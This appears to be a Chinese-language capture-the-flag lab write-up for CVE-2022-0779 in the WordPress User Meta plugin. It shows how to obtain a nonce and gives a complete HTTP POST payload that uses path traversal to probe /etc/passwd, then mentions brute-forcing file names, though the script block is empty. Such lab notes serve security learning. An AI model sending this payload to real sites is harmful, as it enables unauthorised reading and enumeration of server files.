> https://yunjing.ichunqiu.com/cve/detail/1028
> #Information-Disclosure #Wordpress #TODO

> User Meta本地文件枚举。flag生成规则请访问1.txt。账户信息：test
> https://nvd.nist.gov/vuln/detail/CVE-2022-0779
> https://wpscan.com/vulnerability/9d4a3f09-b011-4d87-ab63-332e505cf1cd

正常访问靶机：
![[Pasted image 20230116140511.png]]

根据CVE的数据，首先在页面源码找到`pf_nonce`的值：
![[Pasted image 20230116140618.png]]

然后直接利用：
```plaintext
POST /wp-admin/admin-ajax.php HTTP/1.1
Accept: */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 158
Connection: close
Cookie: [subscriber+]

field_name=test&filepath=/../../../../../../../../etc/passwd&field_id=um_field_4&form_key=Upload&action=um_show_uploaded_file&pf_nonce=4286c1c56a&is_ajax=true
```

返回的数据中存在`umRemoveFile(this)`，就说明文件存在：
![[Pasted image 20230116141052.png]]

同时，访问`/1.txt`查看规则：
![[Pasted image 20230116141201.png]]

于是使用脚本进行爆破：
```python

```